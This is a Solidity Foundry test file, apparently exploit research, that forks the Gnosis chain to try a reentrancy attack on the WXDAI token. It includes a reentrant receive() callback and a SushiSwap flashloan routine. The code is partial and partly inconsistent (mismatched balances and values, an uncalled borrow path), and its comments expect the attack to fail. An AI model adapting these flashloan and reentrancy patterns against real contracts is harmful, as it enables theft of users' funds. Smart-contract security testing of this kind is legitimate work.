// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "template/gnosisscan__coins_and_tokens.sol";
import "interface/gnosisscan_blockchain.sol";

contract GnosisScan_Token_Test is GnosisScanCommon {
    using SafeMath for uint256;

    // Swap or Flashloan provider

    // Governance

    // Protocol with interface

    // Protocol with address only

    // Stable coins

    // Tokens

    // Liquidity Pools

    function setUp() public {
        super.setUp2();

        // Assign label to Swap or Flashloan provider

        // Assign label to Governance

        // Assign label to Protocol with interface

        // Assign label to Protocol with address only

        // Assign label to Stable coins

        // Assign label to Tokens

        // Assign label to Liquidity Pools

        cheats.createSelectFork("gnosis", 28764708);

        // Pre-load tokens
        // writeTokenBalance(address(this), fl_token, payback_fee_amount);
    }

    // ----------------------------------------------------------------------------
    // Token Proxy Implementation
    // ----------------------------------------------------------------------------
    function skip_test__get_token_proxy_impl() public {
        address USDC_impl = USDC.implementation();
        address USDT_impl = USDT.implementation();

        emit log_named_address("USDC_Impl", USDC_impl);
        emit log_named_address("USDT_Impl", USDT_impl);
    }

    // ----------------------------------------------------------------------------
    // Reentrancy Attack on Token Balance
    // ----------------------------------------------------------------------------
    uint totalBorrowed;
    bool xdaiBorrowed = false;

    function testFail__reentrancy_attack() public {
        // Customize the block
        // cheats.createSelectFork("gnosis", 29125988);

        // Expected to revert upon reentrancy withdraw() but weird error coming out
        // cheats.expectRevert();

        // Target Token
        address target_token = address(WXDAI);

        // Attacker is current contract
        address attacker_contract_address = address(this);

        uint account_deposit_amount = 0;
        if (attacker_contract_address != address(this)) {
            // Impersonate as attacker
            cheats.prank(attacker_contract_address);
            cheats.label(
                address(attacker_contract_address),
                "Impersonated_Account"
            );
        } else {
            if (account_deposit_amount > 0) {
                // Fund the account with flashloan and/or cash
                writeTokenBalance(
                    attacker_contract_address,
                    address(WXDAI),
                    account_deposit_amount
                );
            }
        }

        emit log_named_decimal_uint(
            "[Start] Target ETH balance before exploit",
            target_token.balance,
            18
        );

        emit log_named_decimal_uint(
            "[Start] Attacker ETH balance before exploit",
            attacker_contract_address.balance,
            18
        );

        // Attack
        attack();

        emit log_named_decimal_uint(
            "[End] Target ETH balance after exploit",
            target_token.balance,
            18
        );

        emit log_named_decimal_uint(
            "[End] Attacker ETH balance after exploit",
            attacker_contract_address.balance,
            18
        );
    }

    // Either receive or fallback is called when EtherStore sends Ether to this contract.
    // fallback() external payable {
    receive() external payable {
        if (address(WXDAI).balance >= 1 ether) {
            IWXDAI(WXDAI).withdraw(1 ether);
        }
    }

    function attack() internal {
        uint ETH_balance = 1 ether;
        if (ETH_balance > 0) {
            IWXDAI(WXDAI).deposit{value: ETH_balance}();
            IWXDAI(WXDAI).withdraw(ETH_balance);
        }
    }

    function borrow() internal {
        IUniswapV2Factory factory = IUniswapV2Factory(Router.factory());
        IUniswapV2Pair pair = IUniswapV2Pair(
            factory.getPair(address(WXDAI), address(USDC))
        );
        // Apply label
        cheats.label(address(factory), "factory");
        cheats.label(address(pair), "pair");

        // Amount to borrow
        // uint borrowAmount = USDC.balanceOf(address(pair)) - 1;
        uint borrowAmount = 10 * 1e6;

        // Flashloan
        pair.swap(
            pair.token0() == address(WXDAI) ? 0 : borrowAmount,
            pair.token0() == address(WXDAI) ? borrowAmount : 0,
            address(this),
            abi.encode("0x")
        );
    }

    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external {
        attackLogic(_amount0, _amount1, _data);
    }

    function attackLogic(
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) internal {
        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
        totalBorrowed = amountToken;

        emit log_named_decimal_uint(
            "Borrowed USDC from SushiSwap",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        emit log_named_decimal_uint(
            "[Before deposit] Target USDC",
            USDC.balanceOf(address(WXDAI)),
            USDC.decimals()
        );

        deposit_USDC();

        emit log_named_decimal_uint(
            "[After deposit] Target USDC",
            USDC.balanceOf(address(WXDAI)),
            USDC.decimals()
        );

        uint amountRepay = ((amountToken * 1000) / 997) + 1;
        emit log_named_decimal_uint(
            "Going to repay Flashloan USDC to SushiSwap:",
            amountRepay / 1e6,
            USDC.decimals()
        );
        USDC.transfer(msg.sender, amountRepay);
        emit log_named_decimal_uint(
            "Repaid Flashloan USDC to SushiSwap:",
            amountRepay / 1e6,
            USDC.decimals()
        );
    }

    function deposit_USDC() internal {
        IUniswapV2Factory factory = IUniswapV2Factory(Router.factory());
        address pair = factory.getPair(address(WXDAI), address(USDC));
        // Apply label
        cheats.label(address(factory), "factory");
        cheats.label(address(pair), "pair");

        uint USDC_balance = USDC.balanceOf(address(this));
        if (USDC_balance > 0) {
            // Approval
            USDC.approve(address(Router), USDC_balance);
            // USDC.approve(address(pair), USDC_balance);

            IWXDAI(WXDAI).deposit{value: (USDC_balance)}();
        }

        // // Swap tokens
        // USDC_to_symbol(WXDAI, USDC_balance);

        // emit log_named_decimal_uint(
        //     "Converted xDAI balance",
        //     xDAI.balanceOf(address(this)),
        //     xDAI.decimals()
        // );

        // uint xDAI_balance = xDAI.balanceOf(address(this));
        // if (xDAI_balance > 0) {
        //     IWXDAI(WXDAI).deposit{value: xDAI_balance}();
        // }
    }

    function onTokenTransfer(
        address _from,
        uint256 _value,
        bytes memory _data
    ) external {
        IUniswapV2Factory factory = IUniswapV2Factory(Router.factory());
        address pair = factory.getPair(address(WXDAI), address(USDC));
        // Apply label
        cheats.label(address(factory), "factory");
        cheats.label(address(pair), "pair");

        if (_from != pair && xdaiBorrowed == false) {
            console.log("''i'm in!''");
            // borrowXdai();
        }
    }
}
